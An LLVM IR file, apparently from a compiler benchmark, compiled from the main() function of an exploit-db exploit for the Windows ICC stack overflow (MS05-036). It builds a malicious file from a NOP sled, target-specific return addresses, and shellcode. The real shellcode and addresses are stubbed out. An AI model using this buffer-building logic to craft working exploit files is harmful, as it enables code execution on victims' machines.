; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1506.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1506.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }

@TARGET = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@stack_land_offset = common dso_local global i32 0, align 4
@tag_content_offset = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [48 x i8] c"* Windows ICC stack overflow exploit (MS05-36)\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"* Code Execution Exploit\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"* (c) Darkeagle [ private code ]\0A\00", align 1
@.str.4 = private unnamed_addr constant [45 x i8] c"* usage -> ms05-036 <target> (jmp/call esp)\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"0x%x\00", align 1
@buff = common dso_local global i32 0, align 4
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@no_access_violate2 = common dso_local global i32 0, align 4
@no_access_violate = common dso_local global i32 0, align 4
@ret_addr_offset = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"current size: 0x%.8X\0A\00", align 1
@content_size_offset = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %13 = load i32, i32* @TARGET, align 4
  store i32 %13, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %14 = load i32, i32* @shellcode, align 4
  %15 = call i32 @strlen(i32 %14)
  store i32 %15, i32* %10, align 4
  %16 = load i32, i32* @stack_land_offset, align 4
  %17 = load i32, i32* @tag_content_offset, align 4
  %18 = sub nsw i32 %16, %17
  %19 = add nsw i32 %18, 1
  %20 = load i32, i32* %10, align 4
  %21 = add i32 %19, %20
  store i32 %21, i32* %11, align 4
  store i64 0, i64* %12, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 2
  br i1 %23, label %24, label %32

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0))
  %30 = call i32 (...) @list_target()
  %31 = call i32 @exit(i32 0) #3
  unreachable

32:                                               ; preds = %2
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @atoi(i8* %35)
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %4, align 4
  %38 = icmp eq i32 %37, 3
  br i1 %38, label %39, label %44

39:                                               ; preds = %32
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 2
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @sscanf(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i64* %12)
  br label %44

44:                                               ; preds = %39, %32
  %45 = load i32, i32* @buff, align 4
  %46 = load i32, i32* @tag_content_offset, align 4
  %47 = add nsw i32 %45, %46
  %48 = load i32, i32* %11, align 4
  %49 = call i32 @memset(i32 %47, i32 144, i32 %48)
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sub nsw i32 %51, 1
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = call i32 @t2b(i32 %56)
  %58 = load i32, i32* @buff, align 4
  %59 = load i32, i32* @no_access_violate2, align 4
  %60 = add nsw i32 %58, %59
  %61 = sext i32 %60 to i64
  %62 = inttoptr i64 %61 to i32*
  store i32 %57, i32* %62, align 4
  %63 = call i32 @t2b(i32 4)
  %64 = load i32, i32* @buff, align 4
  %65 = load i32, i32* @no_access_violate, align 4
  %66 = add nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = inttoptr i64 %67 to i32*
  store i32 %63, i32* %68, align 4
  %69 = load i64, i64* %12, align 8
  %70 = icmp eq i64 %69, 0
  br i1 %70, label %71, label %85

71:                                               ; preds = %44
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %73 = load i32, i32* %7, align 4
  %74 = sub nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %75
  %77 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = call i32 @t2b(i32 %78)
  %80 = load i32, i32* @buff, align 4
  %81 = load i32, i32* @ret_addr_offset, align 4
  %82 = add nsw i32 %80, %81
  %83 = sext i32 %82 to i64
  %84 = inttoptr i64 %83 to i32*
  store i32 %79, i32* %84, align 4
  br label %94

85:                                               ; preds = %44
  %86 = load i64, i64* %12, align 8
  %87 = trunc i64 %86 to i32
  %88 = call i32 @t2b(i32 %87)
  %89 = load i32, i32* @buff, align 4
  %90 = load i32, i32* @ret_addr_offset, align 4
  %91 = add nsw i32 %89, %90
  %92 = sext i32 %91 to i64
  %93 = inttoptr i64 %92 to i32*
  store i32 %88, i32* %93, align 4
  br label %94

94:                                               ; preds = %85, %71
  %95 = load i32, i32* @buff, align 4
  %96 = load i32, i32* @stack_land_offset, align 4
  %97 = add nsw i32 %95, %96
  %98 = load i32, i32* @shellcode, align 4
  %99 = load i32, i32* %10, align 4
  %100 = call i32 @strncpy(i32 %97, i32 %98, i32 %99)
  %101 = load i32, i32* @buff, align 4
  %102 = load i32, i32* @stack_land_offset, align 4
  %103 = add nsw i32 %101, %102
  %104 = load i32, i32* %10, align 4
  %105 = call i32 @dword_revert(i32 %103, i32 %104)
  %106 = load i32, i32* %11, align 4
  %107 = lshr i32 %106, 2
  %108 = shl i32 %107, 2
  %109 = add i32 %108, 4
  store i32 %109, i32* %11, align 4
  %110 = load i32, i32* %11, align 4
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i32 %110)
  %112 = load i32, i32* %11, align 4
  %113 = call i32 @t2b(i32 %112)
  %114 = load i32, i32* @buff, align 4
  %115 = load i32, i32* @content_size_offset, align 4
  %116 = add nsw i32 %114, %115
  %117 = sext i32 %116 to i64
  %118 = inttoptr i64 %117 to i32*
  store i32 %113, i32* %118, align 4
  %119 = call i32 (...) @buildfile()
  ret i32 0
}

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @list_target(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i64*) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @t2b(i32) #1

declare dso_local i32 @strncpy(i32, i32, i32) #1

declare dso_local i32 @dword_revert(i32, i32) #1

declare dso_local i32 @buildfile(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
